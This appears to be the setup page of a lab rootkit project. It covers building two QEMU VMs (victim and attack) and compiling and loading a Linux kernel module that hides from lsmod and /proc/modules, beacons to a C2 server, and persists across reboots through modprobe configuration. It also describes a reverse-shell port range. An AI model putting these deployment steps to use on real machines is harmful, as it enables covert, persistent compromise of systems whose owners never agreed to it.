---
title: Get Started
description: Set up the VMs, build the kernel module, and deploy the C2 server.
---

## Requirements

- QEMU/KVM (`qemu-system-x86_64`, `qemu-img`)
- Arch Linux ISO (for the initial VM setup)

## VM Setup

Both VMs (victim and attack) are created from the same base Arch Linux install. The `create-VMs.sh` script handles this: it boots the installer, waits for you to install the system, then copies the resulting disk image to produce `attack_disk_image`.

```sh
cd virtual-machines

# Create both disk images (boots the Arch installer — install once, copies twice)
./create-VMs.sh /path/to/archlinux.iso
```

**Inside the VM** — install using the provided archinstall config:

```sh
mkdir /mnt/share
mount -t 9p -o trans=virtio epirootkit /mnt/share
archinstall --config /mnt/share/user_configuration.json \
            --creds /mnt/share/user_credentials.json --silent
shutdown now
```

After installation, two disk images are present: `victim_disk_image` and `attack_disk_image`.

Start either VM by name:

```sh
./start-vm.sh victim   # boot the victim VM
./start-vm.sh attack   # boot the attacking VM
```

**Default credentials after install: `root` / `root`**

SSH ports are forwarded to the host — each VM uses a distinct port so both can run simultaneously:

### Victim machine

| Host port | Guest port | Purpose |
|-----------|------------|---------|
| 10022     | 22         | SSH     |

### Attacking machine

| Host port | Guest port | Purpose             |
|-----------|------------|---------------------|
| 10023     | 22         | SSH                 |
| 5000      | 5000       | C2 web interface    |
| 9000–9500 | 9000–9500  | Reverse shell range |

```sh
ssh root@localhost -p 10022   # victim
ssh root@localhost -p 10023   # attack
```

## Building and Loading the Kernel Module

> **Note:** This section describes the manual build and load process, which is mostly useful for debugging. For normal use, prefer the `install.sh` script described in [Persistence](#persistence).

Push sources to the victim machine via SCP (from the repo root):

```sh
scp -P 10022 -r rootkit/ root@localhost:/rootkit
```

On the victim machine:

```sh
cd /rootkit
make modules        # produces src/wlkom.ko
make clean
```

The `c2_host` parameter is required. `eshell_md5_password` is the pre-computed MD5 hex digest of the encrypted-shell password (compute it with `echo -n 'secret' | md5sum | cut -d' ' -f1`):

```sh
insmod src/wlkom.ko c2_host=<C2_IP> eshell_md5_password=<md5>
dmesg | tail        # check kernel logs
```

When installed via `install.sh`, both parameters are set automatically in `/etc/modprobe.d/wlkom.conf` and `modprobe wlkom` is used instead.

Once loaded, the module is invisible in `lsmod` and `/proc/modules`.

The UUID returned by `/register` is persisted in `/rootkit/uuid` on the victim. On subsequent loads, registration is skipped and the existing UUID is reused.

If the C2 server is unreachable at load time, `insmod` still succeeds. The polling thread retries registration every 5 seconds in the background until the server responds, then switches to normal polling.

## Persistence

The rootkit loads automatically on every boot of the victim VM using `systemd-modules-load`. The helper script `rootkit/install.sh` handles compilation, persistence setup, and immediately loads the module.

**From the repo root on your host**, push the sources to the VM:

```sh
scp -P 10022 -r rootkit/ root@localhost:/rootkit
```

**On the victim VM**, compile and install:

```sh
cd /rootkit
./install.sh <C2_IP> [-p <password>]
```

Replace `<C2_IP>` with the IP of the C2 server as seen from inside the VM. If `-p` is omitted the script prompts interactively and asks for confirmation.

The script:
- Compiles the module against the running VM kernel with `make modules`.
- Copies `src/wlkom.ko` to `/lib/modules/$(uname -r)/kernel/lib/wlkom.ko`.
- Writes `/etc/modprobe.d/wlkom.conf` with `c2_host=<C2_IP>` and `eshell_md5_password=<md5>` — the password is stored as its MD5 digest, never in plaintext.
- Writes `/etc/modules-load.d/wlkom.conf` to auto-load `wlkom` at boot.
- Runs `depmod -a` to index the new module, then immediately loads it with `modprobe wlkom`.

The rootkit is also robust to late network availability: if `systemd-modules-load` starts before the network interface is up, the polling thread retries registration with the C2 every 5 seconds in the background until it succeeds.
